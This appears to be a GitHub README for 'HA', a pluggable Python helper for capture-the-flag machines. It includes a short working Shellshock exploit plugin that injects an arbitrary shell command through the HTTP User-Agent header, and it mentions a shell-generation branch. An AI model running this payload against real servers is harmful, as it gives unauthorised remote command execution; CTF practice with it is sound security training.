# HA

Small pluggable Python tool to assists in CTF-type machines.

## Installation
* `git clone https://github.com/ItsJayRadz/ha`
* `python -m venv .venv`
* `pip install -e .`


## Plugins

Currently there are 3 command branches:

* `remote`
* `shellgen`
* `serve`

An example plugin for a remote exploit is provided with the `shellshock.py` plugin.
Plugins are registered by their filename and are based on click commands.

```python
import click, requests

@click.command()
@click.argument("url")
@click.argument("cmd")
def command(url, cmd):
    """Exploit Shellshock via HTTP headers."""
    headers = {"User-Agent": f"() {{ :; }}; echo; {cmd}"}
    r = requests.get(url, headers=headers)
    click.echo(r.text)
```

`requests` is installed for communication to servers as well as Paramiko for SSH automation scripts.


